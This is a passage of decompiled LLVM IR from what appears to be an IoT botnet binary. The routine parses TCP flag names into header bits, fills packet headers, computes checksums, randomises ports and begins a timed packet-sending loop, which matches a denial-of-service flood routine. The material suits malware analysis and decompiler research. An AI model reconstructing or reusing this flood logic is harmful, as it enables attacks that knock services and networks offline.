  %v4_80507bc = load i32, i32* %edx.global-to-local, align 4
  %v5_80507bc = and i32 %v4_80507bc, -256
  %v6_80507bc = or i32 %v3_80507bc, %v5_80507bc
  %v7_80507bc = xor i32 %v6_80507bc, 1
  store i32 %v7_80507bc, i32* %edx.global-to-local, align 4
  %v1_80507c4 = trunc i32 %v7_80507bc to i8
  %v3_80507c4 = zext i1 %v0_80507bc to i8
  %v4_80507c4 = sub nsw i8 %v1_80507c4, %v3_80507c4
  %v15_80507c4 = icmp eq i8 %v4_80507c4, 0
  %v2_80507c8 = sext i8 %v4_80507c4 to i32
  store i32 %v2_80507c8, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80507cd = icmp eq i1 %v15_80507c4, false
  br i1 %v1_80507cd, label %dec_label_pc_80507f8, label %dec_label_pc_80507cf

dec_label_pc_80507cf:                             ; preds = %dec_label_pc_805078a
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v1_80507d2 = add i32 %v2_8050682, 33
  %v2_80507d2 = inttoptr i32 %v1_80507d2 to i8*
  %v3_80507d2 = load i8, i8* %v2_80507d2, align 1
  %v2_80507d6 = or i8 %v3_80507d2, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_80507d6 = zext i8 %v2_80507d6 to i32
  store i32 %v7_80507d6, i32* %eax.global-to-local, align 4
  store i8 %v2_80507d6, i8* %v2_80507d2, align 1
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v3_80507de = load i8, i8* %v2_80507d2, align 1
  %v2_80507e2 = or i8 %v3_80507de, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_80507e2 = zext i8 %v2_80507e2 to i32
  store i32 %v7_80507e2, i32* %eax.global-to-local, align 4
  store i8 %v2_80507e2, i8* %v2_80507d2, align 1
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v3_80507ea = load i8, i8* %v2_80507d2, align 1
  %v2_80507ee = or i8 %v3_80507ea, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_80507ee = zext i8 %v2_80507ee to i32
  store i32 %v7_80507ee, i32* %eax.global-to-local, align 4
  store i8 %v2_80507ee, i8* %v2_80507d2, align 1
  br label %dec_label_pc_8050a98

dec_label_pc_80507f8:                             ; preds = %dec_label_pc_805078a
  store i32 %v3_8050540, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v3_8050540, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_806a7ca.145 to i32), i32* @edi, align 4
  %v7_8050828 = call i32 @_strncmp(i8* %v4_805071f, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806a7ca.145, i32 0, i32 0), i32 5)
  %v8_8050828 = urem i32 %v7_8050828, 2
  %v9_8050828 = icmp eq i32 %v8_8050828, 0
  %v0_805082a = load i1, i1* %cf.global-to-local, align 1
  %v2_805082a = or i1 %v0_805082a, %v9_8050828
  %v3_805082a = zext i1 %v2_805082a to i32
  %v4_805082a = load i32, i32* %edx.global-to-local, align 4
  %v5_805082a = and i32 %v4_805082a, -256
  %v6_805082a = or i32 %v3_805082a, %v5_805082a
  %v7_805082a = xor i32 %v6_805082a, 1
  store i32 %v7_805082a, i32* @edx, align 4
  %v3_8050830 = and i32 %v7_8050828, -256
  %v1_8050832 = trunc i32 %v7_805082a to i8
  %v3_8050832 = zext i1 %v0_805082a to i8
  %v4_8050832 = sub nsw i8 %v1_8050832, %v3_8050832
  %v15_8050832 = icmp eq i8 %v4_8050832, 0
  %v20_8050832 = zext i8 %v4_8050832 to i32
  %v23_8050832 = or i32 %v20_8050832, %v3_8050830
  store i32 %v23_8050832, i32* @ecx, align 4
  %v2_8050836 = sext i8 %v4_8050832 to i32
  store i32 %v2_8050836, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805083b = icmp eq i1 %v15_8050832, false
  br i1 %v1_805083b, label %dec_label_pc_805085a, label %dec_label_pc_805083d

dec_label_pc_805083d:                             ; preds = %dec_label_pc_80507f8
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v1_8050840 = add i32 %v2_8050682, 33
  %v2_8050840 = inttoptr i32 %v1_8050840 to i8*
  %v3_8050840 = load i8, i8* %v2_8050840, align 1
  %v2_8050844 = or i8 %v3_8050840, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050844 = zext i8 %v2_8050844 to i32
  store i32 %v7_8050844, i32* %eax.global-to-local, align 4
  store i8 %v2_8050844, i8* %v2_8050840, align 1
  store i32 %v1_805069a, i32* %edx.global-to-local, align 4
  %v3_805084c = load i8, i8* %v2_8050840, align 1
  %v2_8050850 = or i8 %v3_805084c, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050850 = zext i8 %v2_8050850 to i32
  store i32 %v7_8050850, i32* %eax.global-to-local, align 4
  store i8 %v2_8050850, i8* %v2_8050840, align 1
  br label %dec_label_pc_8050a98

dec_label_pc_805085a:                             ; preds = %dec_label_pc_80507f8
  store i32 %v3_8050540, i32* @eax, align 4
  %v0_805085d = load i32, i32* @esp, align 4
  %v1_805085d = add i32 %v0_805085d, 4
  %v2_805085d = inttoptr i32 %v1_805085d to i32*
  store i32 ptrtoint (i32* @global_var_806a7de.148 to i32), i32* %v2_805085d, align 4
  %v0_8050865 = load i32, i32* @eax, align 4
  %v1_8050865 = load i32, i32* @esp, align 4
  %v2_8050865 = inttoptr i32 %v1_8050865 to i32*
  store i32 %v0_8050865, i32* %v2_8050865, align 4
  %v3_8050868 = call i32 @__GI_strtok(i32 5, i32 ptrtoint ([5 x i8]* @global_var_806a7ca.145 to i32))
  store i32 %v3_8050868, i32* %eax.global-to-local, align 4
  %v5_805086d = inttoptr i32 %v3_8050868 to i8*
  store i8* %v5_805086d, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_8050a8e35 = icmp eq i32 %v3_8050868, 0
  %v1_8050a9242 = icmp eq i1 %v5_8050a8e35, false
  br i1 %v1_8050a9242, label %dec_label_pc_8050875.lr.ph, label %dec_label_pc_8050a98

dec_label_pc_8050875.lr.ph:                       ; preds = %dec_label_pc_805085a
  %v1_8050a6d = add i32 %v2_8050682, 33
  %v2_8050a6d = inttoptr i32 %v1_8050a6d to i8*
  %tmp117 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_8050875

dec_label_pc_8050875:                             ; preds = %dec_label_pc_8050875.lr.ph, %dec_label_pc_8050a77
  %v3_8050a25 = phi i8* [ %v5_805086d, %dec_label_pc_8050875.lr.ph ], [ %tmp118, %dec_label_pc_8050a77 ]
  %stack_var_-228.144 = phi i32 [ %tmp55, %dec_label_pc_8050875.lr.ph ], [ %stack_var_-228.0, %dec_label_pc_8050a77 ]
  %stack_var_-224.143 = phi i8* [ %tmp56, %dec_label_pc_8050875.lr.ph ], [ %stack_var_-224.0, %dec_label_pc_8050a77 ]
  %v4_8050875 = ptrtoint i8* %v3_8050a25 to i32
  store i32 %v4_8050875, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050875, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7e0.149 to i32), i32* @edi, align 4
  %v7_80508a5 = call i32 @_strncmp(i8* %v3_8050a25, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7e0.149, i32 0, i32 0), i32 4)
  %v8_80508a5 = urem i32 %v7_80508a5, 2
  %v9_80508a5 = icmp eq i32 %v8_80508a5, 0
  %v0_80508a7 = load i1, i1* %cf.global-to-local, align 1
  %v2_80508a7 = or i1 %v0_80508a7, %v9_80508a5
  %v3_80508a7 = zext i1 %v2_80508a7 to i32
  %v4_80508a7 = load i32, i32* @edx, align 4
  %v5_80508a7 = and i32 %v4_80508a7, -256
  %v6_80508a7 = or i32 %v3_80508a7, %v5_80508a7
  %v7_80508a7 = xor i32 %v6_80508a7, 1
  store i32 %v7_80508a7, i32* %edx.global-to-local, align 4
  %v3_80508ad = and i32 %v7_80508a5, -256
  %v1_80508af = trunc i32 %v7_80508a7 to i8
  %v3_80508af = zext i1 %v0_80508a7 to i8
  %v4_80508af = sub nsw i8 %v1_80508af, %v3_80508af
  %v15_80508af = icmp eq i8 %v4_80508af, 0
  %v20_80508af = zext i8 %v4_80508af to i32
  %v23_80508af = or i32 %v20_80508af, %v3_80508ad
  store i32 %v23_80508af, i32* @ecx, align 4
  %v2_80508b3 = sext i8 %v4_80508af to i32
  store i32 %v2_80508b3, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80508b8 = icmp eq i1 %v15_80508af, false
  br i1 %v1_80508b8, label %dec_label_pc_80508cc, label %dec_label_pc_80508ba

dec_label_pc_80508ba:                             ; preds = %dec_label_pc_8050875
  store i32 %v1_805069a, i32* @eax, align 4
  %v3_80508bd = load i8, i8* %v2_8050a6d, align 1
  %v2_80508c1 = or i8 %v3_80508bd, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_80508c1 = zext i8 %v2_80508c1 to i32
  store i32 %v7_80508c1, i32* @edx, align 4
  store i8 %v2_80508c1, i8* %v2_8050a6d, align 1
  br label %dec_label_pc_8050a77

dec_label_pc_80508cc:                             ; preds = %dec_label_pc_8050875
  store i32 %v4_8050875, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050875, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7e4.150 to i32), i32* @edi, align 4
  %v7_80508fc = call i32 @_strncmp(i8* %v3_8050a25, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7e4.150, i32 0, i32 0), i32 4)
  %v8_80508fc = urem i32 %v7_80508fc, 2
  %v9_80508fc = icmp eq i32 %v8_80508fc, 0
  %v0_80508fe = load i1, i1* %cf.global-to-local, align 1
  %v2_80508fe = or i1 %v0_80508fe, %v9_80508fc
  %v3_80508fe = zext i1 %v2_80508fe to i32
  %v4_80508fe = load i32, i32* %edx.global-to-local, align 4
  %v5_80508fe = and i32 %v4_80508fe, -256
  %v6_80508fe = or i32 %v3_80508fe, %v5_80508fe
  %v7_80508fe = xor i32 %v6_80508fe, 1
  store i32 %v7_80508fe, i32* %edx.global-to-local, align 4
  %v3_8050904 = and i32 %v7_80508fc, -256
  %v1_8050906 = trunc i32 %v7_80508fe to i8
  %v3_8050906 = zext i1 %v0_80508fe to i8
  %v4_8050906 = sub nsw i8 %v1_8050906, %v3_8050906
  %v15_8050906 = icmp eq i8 %v4_8050906, 0
  %v20_8050906 = zext i8 %v4_8050906 to i32
  %v23_8050906 = or i32 %v20_8050906, %v3_8050904
  store i32 %v23_8050906, i32* @ecx, align 4
  %v2_805090a = sext i8 %v4_8050906 to i32
  store i32 %v2_805090a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805090f = icmp eq i1 %v15_8050906, false
  br i1 %v1_805090f, label %dec_label_pc_8050923, label %dec_label_pc_8050911

dec_label_pc_8050911:                             ; preds = %dec_label_pc_80508cc
  store i32 %v1_805069a, i32* @eax, align 4
  %v3_8050914 = load i8, i8* %v2_8050a6d, align 1
  %v2_8050918 = or i8 %v3_8050914, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050918 = zext i8 %v2_8050918 to i32
  store i32 %v7_8050918, i32* @edx, align 4
  store i8 %v2_8050918, i8* %v2_8050a6d, align 1
  br label %dec_label_pc_8050a77

dec_label_pc_8050923:                             ; preds = %dec_label_pc_80508cc
  store i32 %v4_8050875, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050875, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7e8.151 to i32), i32* @edi, align 4
  %v7_8050953 = call i32 @_strncmp(i8* %v3_8050a25, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7e8.151, i32 0, i32 0), i32 4)
  %v8_8050953 = urem i32 %v7_8050953, 2
  %v9_8050953 = icmp eq i32 %v8_8050953, 0
  %v0_8050955 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050955 = or i1 %v0_8050955, %v9_8050953
  %v3_8050955 = zext i1 %v2_8050955 to i32
  %v4_8050955 = load i32, i32* %edx.global-to-local, align 4
  %v5_8050955 = and i32 %v4_8050955, -256
  %v6_8050955 = or i32 %v3_8050955, %v5_8050955
  %v7_8050955 = xor i32 %v6_8050955, 1
  store i32 %v7_8050955, i32* %edx.global-to-local, align 4
  %v3_805095b = and i32 %v7_8050953, -256
  %v1_805095d = trunc i32 %v7_8050955 to i8
  %v3_805095d = zext i1 %v0_8050955 to i8
  %v4_805095d = sub nsw i8 %v1_805095d, %v3_805095d
  %v15_805095d = icmp eq i8 %v4_805095d, 0
  %v20_805095d = zext i8 %v4_805095d to i32
  %v23_805095d = or i32 %v20_805095d, %v3_805095b
  store i32 %v23_805095d, i32* @ecx, align 4
  %v2_8050961 = sext i8 %v4_805095d to i32
  store i32 %v2_8050961, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050966 = icmp eq i1 %v15_805095d, false
  br i1 %v1_8050966, label %dec_label_pc_805097a, label %dec_label_pc_8050968

dec_label_pc_8050968:                             ; preds = %dec_label_pc_8050923
  store i32 %v1_805069a, i32* @eax, align 4
  %v3_805096b = load i8, i8* %v2_8050a6d, align 1
  %v2_805096f = or i8 %v3_805096b, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_805096f = zext i8 %v2_805096f to i32
  store i32 %v7_805096f, i32* @edx, align 4
  store i8 %v2_805096f, i8* %v2_8050a6d, align 1
  br label %dec_label_pc_8050a77

dec_label_pc_805097a:                             ; preds = %dec_label_pc_8050923
  store i32 %v4_8050875, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050875, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7ec.152 to i32), i32* @edi, align 4
  %v7_80509aa = call i32 @_strncmp(i8* %v3_8050a25, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7ec.152, i32 0, i32 0), i32 4)
  %v8_80509aa = urem i32 %v7_80509aa, 2
  %v9_80509aa = icmp eq i32 %v8_80509aa, 0
  %v0_80509ac = load i1, i1* %cf.global-to-local, align 1
  %v2_80509ac = or i1 %v0_80509ac, %v9_80509aa
  %v3_80509ac = zext i1 %v2_80509ac to i32
  %v4_80509ac = load i32, i32* %edx.global-to-local, align 4
  %v5_80509ac = and i32 %v4_80509ac, -256
  %v6_80509ac = or i32 %v3_80509ac, %v5_80509ac
  %v7_80509ac = xor i32 %v6_80509ac, 1
  store i32 %v7_80509ac, i32* %edx.global-to-local, align 4
  %v3_80509b2 = and i32 %v7_80509aa, -256
  %v1_80509b4 = trunc i32 %v7_80509ac to i8
  %v3_80509b4 = zext i1 %v0_80509ac to i8
  %v4_80509b4 = sub nsw i8 %v1_80509b4, %v3_80509b4
  %v15_80509b4 = icmp eq i8 %v4_80509b4, 0
  %v20_80509b4 = zext i8 %v4_80509b4 to i32
  %v23_80509b4 = or i32 %v20_80509b4, %v3_80509b2
  store i32 %v23_80509b4, i32* @ecx, align 4
  %v2_80509b8 = sext i8 %v4_80509b4 to i32
  store i32 %v2_80509b8, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80509bd = icmp eq i1 %v15_80509b4, false
  br i1 %v1_80509bd, label %dec_label_pc_80509d1, label %dec_label_pc_80509bf

dec_label_pc_80509bf:                             ; preds = %dec_label_pc_805097a
  store i32 %v1_805069a, i32* @eax, align 4
  %v3_80509c2 = load i8, i8* %v2_8050a6d, align 1
  %v2_80509c6 = or i8 %v3_80509c2, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_80509c6 = zext i8 %v2_80509c6 to i32
  store i32 %v7_80509c6, i32* @edx, align 4
  store i8 %v2_80509c6, i8* %v2_8050a6d, align 1
  br label %dec_label_pc_8050a77

dec_label_pc_80509d1:                             ; preds = %dec_label_pc_805097a
  store i32 %v4_8050875, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050875, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7f0.153 to i32), i32* @edi, align 4
  %v7_8050a01 = call i32 @_strncmp(i8* %v3_8050a25, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7f0.153, i32 0, i32 0), i32 4)
  %v8_8050a01 = urem i32 %v7_8050a01, 2
  %v9_8050a01 = icmp eq i32 %v8_8050a01, 0
  %v0_8050a03 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050a03 = or i1 %v0_8050a03, %v9_8050a01
  %v3_8050a03 = zext i1 %v2_8050a03 to i32
  %v4_8050a03 = load i32, i32* %edx.global-to-local, align 4
  %v5_8050a03 = and i32 %v4_8050a03, -256
  %v6_8050a03 = or i32 %v3_8050a03, %v5_8050a03
  %v7_8050a03 = xor i32 %v6_8050a03, 1
  store i32 %v7_8050a03, i32* %edx.global-to-local, align 4
  %v3_8050a09 = and i32 %v7_8050a01, -256
  %v1_8050a0b = trunc i32 %v7_8050a03 to i8
  %v3_8050a0b = zext i1 %v0_8050a03 to i8
  %v4_8050a0b = sub nsw i8 %v1_8050a0b, %v3_8050a0b
  %v15_8050a0b = icmp eq i8 %v4_8050a0b, 0
  %v20_8050a0b = zext i8 %v4_8050a0b to i32
  %v23_8050a0b = or i32 %v20_8050a0b, %v3_8050a09
  store i32 %v23_8050a0b, i32* @ecx, align 4
  %v2_8050a0f = sext i8 %v4_8050a0b to i32
  store i32 %v2_8050a0f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050a14 = icmp eq i1 %v15_8050a0b, false
  br i1 %v1_8050a14, label %dec_label_pc_8050a25, label %dec_label_pc_8050a16

dec_label_pc_8050a16:                             ; preds = %dec_label_pc_80509d1
  store i32 %v1_805069a, i32* @eax, align 4
  %v3_8050a19 = load i8, i8* %v2_8050a6d, align 1
  %v2_8050a1d = or i8 %v3_8050a19, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050a1d = zext i8 %v2_8050a1d to i32
  store i32 %v7_8050a1d, i32* @edx, align 4
  store i8 %v2_8050a1d, i8* %v2_8050a6d, align 1
  br label %dec_label_pc_8050a77

dec_label_pc_8050a25:                             ; preds = %dec_label_pc_80509d1
  store i32 %v4_8050875, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050875, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7f4.154 to i32), i32* @edi, align 4
  %v7_8050a55 = call i32 @_strncmp(i8* %v3_8050a25, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7f4.154, i32 0, i32 0), i32 4)
  %v8_8050a55 = urem i32 %v7_8050a55, 2
  %v9_8050a55 = icmp eq i32 %v8_8050a55, 0
  %v0_8050a57 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050a57 = or i1 %v0_8050a57, %v9_8050a55
  %v3_8050a57 = zext i1 %v2_8050a57 to i32
  %v4_8050a57 = load i32, i32* %edx.global-to-local, align 4
  %v5_8050a57 = and i32 %v4_8050a57, -256
  %v6_8050a57 = or i32 %v3_8050a57, %v5_8050a57
  %v7_8050a57 = xor i32 %v6_8050a57, 1
  store i32 %v7_8050a57, i32* @edx, align 4
  %v3_8050a5d = and i32 %v7_8050a55, -256
  %v1_8050a5f = trunc i32 %v7_8050a57 to i8
  %v3_8050a5f = zext i1 %v0_8050a57 to i8
  %v4_8050a5f = sub nsw i8 %v1_8050a5f, %v3_8050a5f
  %v15_8050a5f = icmp eq i8 %v4_8050a5f, 0
  %v20_8050a5f = zext i8 %v4_8050a5f to i32
  %v23_8050a5f = or i32 %v20_8050a5f, %v3_8050a5d
  store i32 %v23_8050a5f, i32* @ecx, align 4
  %v2_8050a63 = sext i8 %v4_8050a5f to i32
  store i32 %v2_8050a63, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050a68 = icmp eq i1 %v15_8050a5f, false
  br i1 %v1_8050a68, label %dec_label_pc_8050a77, label %dec_label_pc_8050a6a

dec_label_pc_8050a6a:                             ; preds = %dec_label_pc_8050a25
  store i32 %v1_805069a, i32* @eax, align 4
  %v3_8050a6d = load i8, i8* %v2_8050a6d, align 1
  %v2_8050a71 = or i8 %v3_8050a6d, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050a71 = zext i8 %v2_8050a71 to i32
  store i32 %v7_8050a71, i32* @edx, align 4
  store i8 %v2_8050a71, i8* %v2_8050a6d, align 1
  br label %dec_label_pc_8050a77

dec_label_pc_8050a77:                             ; preds = %dec_label_pc_8050a25, %dec_label_pc_8050a16, %dec_label_pc_80509bf, %dec_label_pc_8050968, %dec_label_pc_8050911, %dec_label_pc_80508ba, %dec_label_pc_8050a6a
  %stack_var_-224.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7f4.154, i32 0, i32 0), %dec_label_pc_8050a25 ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7f4.154, i32 0, i32 0), %dec_label_pc_8050a6a ], [ %stack_var_-224.143, %dec_label_pc_8050a16 ], [ %stack_var_-224.143, %dec_label_pc_80509bf ], [ %stack_var_-224.143, %dec_label_pc_8050968 ], [ %stack_var_-224.143, %dec_label_pc_8050911 ], [ %stack_var_-224.143, %dec_label_pc_80508ba ]
  %stack_var_-228.0 = phi i32 [ 4, %dec_label_pc_8050a25 ], [ 4, %dec_label_pc_8050a6a ], [ %stack_var_-228.144, %dec_label_pc_8050a16 ], [ %stack_var_-228.144, %dec_label_pc_80509bf ], [ %stack_var_-228.144, %dec_label_pc_8050968 ], [ %stack_var_-228.144, %dec_label_pc_8050911 ], [ %stack_var_-228.144, %dec_label_pc_80508ba ]
  %v0_8050a77 = load i32, i32* @esp, align 4
  %v1_8050a77 = add i32 %v0_8050a77, 4
  %v2_8050a77 = inttoptr i32 %v1_8050a77 to i32*
  store i32 ptrtoint (i32* @global_var_806a7de.148 to i32), i32* %v2_8050a77, align 4
  %v0_8050a7f = load i32, i32* @esp, align 4
  %v1_8050a7f = inttoptr i32 %v0_8050a7f to i32*
  store i32 0, i32* %v1_8050a7f, align 4
  %v2_8050a86 = ptrtoint i8* %stack_var_-224.0 to i32
  %v3_8050a86 = call i32 @__GI_strtok(i32 %stack_var_-228.0, i32 %v2_8050a86)
  store i32 %v3_8050a86, i32* %eax.global-to-local, align 4
  store i32 %v3_8050a86, i32* %tmp117, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_8050a8e = icmp eq i32 %v3_8050a86, 0
  %v1_8050a92 = icmp eq i1 %v5_8050a8e, false
  %tmp118 = inttoptr i32 %v3_8050a86 to i8*
  br i1 %v1_8050a92, label %dec_label_pc_8050875, label %dec_label_pc_8050a98

dec_label_pc_8050a98:                             ; preds = %dec_label_pc_8050a77, %dec_label_pc_805085a, %dec_label_pc_805083d, %dec_label_pc_80507cf, %dec_label_pc_805073d
  %v1_8050a9b = add i32 %v2_8050682, 34
  %v2_8050a9b = inttoptr i32 %v1_8050a9b to i16*
  store i16 2048, i16* %v2_8050a9b, align 2
  %v1_8050aa4 = add i32 %v2_8050682, 36
  %v2_8050aa4 = inttoptr i32 %v1_8050aa4 to i16*
  store i16 0, i16* %v2_8050aa4, align 4
  store i32 %v1_805069a, i32* %eax.global-to-local, align 4
  %v1_8050aad = add i32 %v2_8050682, 38
  %v2_8050aad = inttoptr i32 %v1_8050aad to i16*
  store i16 0, i16* %v2_8050aad, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_8050571, label %dec_label_pc_8050ac6, label %dec_label_pc_8050ab9

dec_label_pc_8050ab9:                             ; preds = %dec_label_pc_8050a98
  %v0_8050ab9 = load i8*, i8** %stack_var_-20, align 4
  %v1_8050ab9 = ptrtoint i8* %v0_8050ab9 to i32
  %v2_8050ab9 = call i32 @rand_cmwc(i32 %v1_8050ab9)
  br label %dec_label_pc_8050ada

dec_label_pc_8050ac6:                             ; preds = %dec_label_pc_8050a98
  %v1_8050ac9 = urem i32 %v3_805052e, 65536
  store i32 %v1_8050ac9, i32* %eax.global-to-local, align 4
  %v1_8050acc = load i32, i32* @esp, align 4
  %v2_8050acc = inttoptr i32 %v1_8050acc to i32*
  store i32 %v1_8050ac9, i32* %v2_8050acc, align 4
  %v3_8050acf = call i32 @htons(i16 %tmp54)
  br label %dec_label_pc_8050ada

dec_label_pc_8050ada:                             ; preds = %dec_label_pc_8050ab9, %dec_label_pc_8050ac6
  %storemerge29.in = phi i32 [ %v2_8050ab9, %dec_label_pc_8050ab9 ], [ %v3_8050acf, %dec_label_pc_8050ac6 ]
  %storemerge = trunc i32 %storemerge29.in to i16
  %sext = mul i32 %storemerge29.in, 65536
  %v4_8050add = sdiv i32 %sext, 65536
  store i32 %v4_8050add, i32* @esi, align 4
  %v3_8050ae0 = add i32 %v2_8050682, 22
  %v4_8050ae0 = inttoptr i32 %v3_8050ae0 to i16*
  store i16 %storemerge, i16* %v4_8050ae0, align 2
  store i32 %v1_805069a, i32* %eax.global-to-local, align 4
  store i32 %v2_8050682, i32* %edx.global-to-local, align 4
  %v1_8050aea = load i32, i32* @esp, align 4
  %v2_8050aea = add i32 %v1_8050aea, 4
  %v3_8050aea = inttoptr i32 %v2_8050aea to i32*
  store i32 %v1_805069a, i32* %v3_8050aea, align 4
  %v0_8050aee = load i32, i32* %edx.global-to-local, align 4
  %v1_8050aee = load i32, i32* @esp, align 4
  %v2_8050aee = inttoptr i32 %v1_8050aee to i32*
  store i32 %v0_8050aee, i32* %v2_8050aee, align 4
  %v3_8050af1 = inttoptr i32 %v4_8050add to i16*
  %v4_8050af1 = call i32 @csum(i16* %v3_8050af1, i32 %v15_8050504)
  %v1_8050af6 = urem i32 %v4_8050af1, 65536
  store i32 %v1_8050af6, i32* %edx.global-to-local, align 4
  %v1_8050afc = trunc i32 %v4_8050af1 to i16
  store i16 %v1_8050afc, i16* %v2_8050aa4, align 4
  store i32 %v2_8050682, i32* %eax.global-to-local, align 4
  %v1_8050b03 = or i32 %v2_8050682, 2
  %v2_8050b03 = inttoptr i32 %v1_8050b03 to i16*
  %v3_8050b03 = load i16, i16* %v2_8050b03, align 2
  %v4_8050b03 = zext i16 %v3_8050b03 to i32
  store i32 %v4_8050b03, i32* %edx.global-to-local, align 4
  store i32 %v2_8050682, i32* %eax.global-to-local, align 4
  %v1_8050b0c = load i32, i32* @esp, align 4
  %v2_8050b0c = add i32 %v1_8050b0c, 4
  %v3_8050b0c = inttoptr i32 %v2_8050b0c to i32*
  store i32 %v4_8050b03, i32* %v3_8050b0c, align 4
  %v0_8050b10 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b10 = load i32, i32* @esp, align 4
  %v2_8050b10 = inttoptr i32 %v1_8050b10 to i32*
  store i32 %v0_8050b10, i32* %v2_8050b10, align 4
  %v4_8050b13 = call i32 @csum(i16* %v3_8050af1, i32 %v15_8050504)
  %v1_8050b18 = urem i32 %v4_8050b13, 65536
  store i32 %v1_8050b18, i32* %edx.global-to-local, align 4
  store i32 %v2_8050682, i32* %eax.global-to-local, align 4
  %v1_8050b1e = trunc i32 %v4_8050b13 to i16
  %v3_8050b1e = or i32 %v2_8050682, 10
  %v4_8050b1e = inttoptr i32 %v3_8050b1e to i16*
  store i16 %v1_8050b1e, i16* %v4_8050b1e, align 2
  %v0_8050b22 = load i32, i32* @esp, align 4
  %v1_8050b22 = inttoptr i32 %v0_8050b22 to i32*
  store i32 0, i32* %v1_8050b22, align 4
  %v2_8050b29 = inttoptr i32 %v4_8050add to i32*
  %v3_8050b29 = call i32 @__GI_time(i32* %v2_8050b29)
  %v5_8050b2e = add i32 %v3_8050b29, %v3_8050537
  %v10_8050b2e = icmp ult i32 %v5_8050b2e, %v3_8050b29
  store i1 %v10_8050b2e, i1* %cf.global-to-local, align 1
  store i32 %v5_8050b2e, i32* %eax.global-to-local, align 4
  %v2_8050b77 = or i32 %v2_8050682, 12
  %v3_8050b77 = inttoptr i32 %v2_8050b77 to i32*
  %v3_8050b85 = or i32 %v2_8050682, 4
  %v4_8050b85 = inttoptr i32 %v3_8050b85 to i16*
  br label %dec_label_pc_8050b3d

dec_label_pc_8050b3d:                             ; preds = %dec_label_pc_8050bf3, %dec_label_pc_8050c10, %dec_label_pc_8050ada
  %stack_var_-100.0 = phi i32 [ 0, %dec_label_pc_8050ada ], [ %v4_8050c10, %dec_label_pc_8050c10 ], [ 0, %dec_label_pc_8050bf3 ]
  store i32 %v2_8050682, i32* %edx.global-to-local, align 4
  %v0_8050b43 = load i32, i32* @esp, align 4
  %v1_8050b43 = add i32 %v0_8050b43, 20
  %v2_8050b43 = inttoptr i32 %v1_8050b43 to i32*
  store i32 16, i32* %v2_8050b43, align 4
  %v1_8050b4b = load i32, i32* @esp, align 4
  %v2_8050b4b = add i32 %v1_8050b4b, 16
  %v3_8050b4b = inttoptr i32 %v2_8050b4b to i32*
  store i32 %v2_8050596, i32* %v3_8050b4b, align 4
  %v0_8050b4f = load i32, i32* @esp, align 4
  %v1_8050b4f = add i32 %v0_8050b4f, 12
  %v2_8050b4f = inttoptr i32 %v1_8050b4f to i32*
  store i32 0, i32* %v2_8050b4f, align 4
  store i32 %v1_805065e, i32* @edi, align 4
  %v1_8050b5a = load i32, i32* @esp, align 4
  %v2_8050b5a = add i32 %v1_8050b5a, 8
  %v3_8050b5a = inttoptr i32 %v2_8050b5a to i32*
